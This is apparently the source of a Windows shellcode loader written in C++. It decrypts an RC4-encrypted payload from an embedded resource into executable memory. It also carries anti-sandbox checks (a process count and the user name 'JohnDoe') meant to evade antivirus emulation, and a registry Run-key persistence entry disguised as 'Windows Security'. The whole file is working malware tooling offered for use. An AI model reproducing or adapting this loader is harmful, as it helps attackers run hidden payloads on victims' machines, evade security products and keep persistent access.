#include<windows.h>
#include<TlHelp32.h>
#define numSandboxUser 1
const WCHAR* sandboxUsername[numSandboxUser] = { L"JohnDoe" };

//shellcode memory to execute
LPVOID Memory;

/**********************************************************************
* @Function: GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
* @Description: Get shellcode from local resource
* @Parameter: resourceID, the rc_data resource ID
* @Parameter: shellcodeSize,the size of shellcode
* @Return: null
**********************************************************************/
void GetShellcodeFromRes(int resourceID, UINT &shellcodeSize);

/**********************************************************************
* @Function:  StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
* @Description: RC4 crypt
* @Parameter: Data,the pointer to data will be encrypted or decrypted
* @Parameter: Length,the size of data
* @Parameter: Key,the pointer to key used to encrypt or decrypt
* @Parameter: KeyLength,the size of data
* @Return: null
**********************************************************************/
void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}


/**********************************************************************
* @Struct: CONFIG
* @Description: config information
* @Member: antisandbox,do you want anti sandbox from options
* @Member: autostart,do you want autostart from options
* @Member: Key[128], 128 bit randomly generated key
**********************************************************************/
struct CONFIG
{
	BOOL antisandbox;
	BOOL autostart;
	unsigned char key[128];
};

/**********************************************************************
* @Function: AntiSimulation()
* @Description: anti av's sandbox by check processnum.you can change this function to use other ways.
* @Parameter: null
* @Return: null
**********************************************************************/
void AntiSimulation()
{
	WCHAR username[3267];
	DWORD charCount = 3267;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		return;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	int procnum = 0;
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe))
	{
		procnum++;
	}
	if (procnum <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
	{
		exit(1);
	}
	if (!GetUserName(username, &charCount)) {
		return;
	}
	for (int i = 0; i < numSandboxUser; ++i) {
		if (wcsicmp(username, sandboxUsername[i]) == 0) {
			exit(1);
		}
	}
}

/**********************************************************************
* @Function: AutoStart()
* @Description: autostart by reg.you can change this function to use other ways.
* @Parameter: null
* @Return: null
**********************************************************************/
void AutoStart()
{
	HKEY hKey;
	char currentpath[256] = { 0 };
	GetModuleFileNameA(NULL, currentpath, 256);
	if (!RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
	{
		RegSetValueExA(hKey, "Windows Security", 0, REG_SZ, (PUCHAR)currentpath, strlen(currentpath));
		RegCloseKey(hKey);
	}
}

/**********************************************************************
* @Function: init(BOOL anti_sandbox, BOOL autostart)
* @Description: initialization before working
* @Parameter: anti_sandbox,do you want anti sandbox
* @Parameter: autostart,do you want autostart
* @Return: null
**********************************************************************/
void init(BOOL anti_sandbox, BOOL autostart)
{
	if (anti_sandbox)  //反仿真
	{
		AntiSimulation();
	}
	if (autostart)  //注册表添加自启动
	{
		AutoStart();
	}
}

void GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
{
	//1.Get resource's pointer
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRsrc == NULL)
		return;
	DWORD totalSize = SizeofResource(NULL, hRsrc);
	if (totalSize == 0)
		return;
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return;
	LPVOID pBuffer = LockResource(hGlobal);
	if (pBuffer == NULL)
		return;
	CONFIG config = { 0 };
	memcpy(&config, pBuffer, sizeof(CONFIG));
	//2.Initialization
	memcpy(&config, pBuffer, sizeof(CONFIG));
	init(config.antisandbox, config.autostart);
	//3.Getshellcode   //TLS回调函数中不能使用new分配内存，否则会出现访问错误，所以直接分配可执行内存
	Memory = VirtualAlloc(NULL, totalSize - sizeof(CONFIG), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, (char *)pBuffer + sizeof(CONFIG), totalSize - sizeof(CONFIG));
	StreamCrypt((unsigned char*)Memory, totalSize - sizeof(CONFIG), config.key, 128);
}
